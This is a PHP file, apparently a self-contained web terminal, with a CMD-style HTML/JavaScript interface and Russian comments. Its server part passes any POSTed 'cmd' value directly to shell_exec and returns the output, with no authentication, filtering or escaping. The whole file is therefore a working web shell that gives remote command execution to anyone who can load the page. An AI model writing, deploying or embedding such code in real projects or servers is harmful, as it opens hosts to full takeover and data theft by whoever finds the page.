<?php
// terminal.php

set_time_limit(30);

if (isset($_POST['cmd'])) {
    $cmd = $_POST['cmd'];
    header('Content-Type: text/plain; charset=utf-8');
    $output = shell_exec($cmd . ' 2>&1');
    echo $output === null ? "Команда не выполнена или вернула пустой результат" : $output;
    exit;
}
?>

<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8" />
<title>PHP Терминал</title>
<style>
  /* Фон и шрифт как в классическом терминале */
  body {
    background-color: black;
    color: #00FF00; /* зелёный как в классическом CMD */
    font-family: 'Consolas', 'Courier New', monospace;
    padding: 10px;
    margin: 0;
    height: 100vh;
    display: flex;
    flex-direction: column;
  }

  #terminal {
    flex-grow: 1;
    overflow-y: auto;
    white-space: pre-wrap;
  }

  #input-line {
    display: flex;
    align-items: center;
    font-family: inherit;
  }

  #prompt {
    user-select: none;
    margin-right: 5px;
  }

  #cmd {
    background: transparent;
    border: none;
    outline: none;
    color: #00FF00;
    font-family: inherit;
    font-size: 1em;
    flex-grow: 1;
  }

  /* Мигающий курсор */
  #cmd::after {
    content: '';
  }

  /* Скроллбар для терминала, чтобы не раздражал */
  #terminal::-webkit-scrollbar {
    width: 8px;
  }
  #terminal::-webkit-scrollbar-track {
    background: #111;
  }
  #terminal::-webkit-scrollbar-thumb {
    background: #333;
  }
</style>
</head>
<body>

<div id="terminal"></div>

<form id="termForm" autocomplete="off" onsubmit="return false;">
  <div id="input-line">
    <span id="prompt">C:\&gt;</span>
    <input type="text" id="cmd" autofocus spellcheck="false" autocomplete="off" />
  </div>
</form>

<script>
  const form = document.getElementById('termForm');
  const cmdInput = document.getElementById('cmd');
  const terminal = document.getElementById('terminal');
  const prompt = document.getElementById('prompt');

  // Можно сделать динамический prompt (например, от пользователя или текущей папки)
  // Пока просто показываем фиксированный

  function printOutput(text) {
    terminal.textContent += text + "\n";
    terminal.scrollTop = terminal.scrollHeight;
  }

  async function runCommand(command) {
    printOutput(prompt.textContent + ' ' + command);
    try {
      const response = await fetch('', {
        method: 'POST',
        headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
        body: new URLSearchParams({ cmd: command })
      });
      const result = await response.text();
      printOutput(result);
    } catch (e) {
      printOutput('Ошибка запроса: ' + e.message);
    }
  }

  cmdInput.addEventListener('keydown', async (e) => {
    if (e.key === 'Enter') {
      e.preventDefault();
      const command = cmdInput.value.trim();
      if (command) {
        await runCommand(command);
      }
      cmdInput.value = '';
    }
  });

  // Ставим фокус в input при загрузке и после вывода результата
  cmdInput.focus();
</script>

</body>
</html>
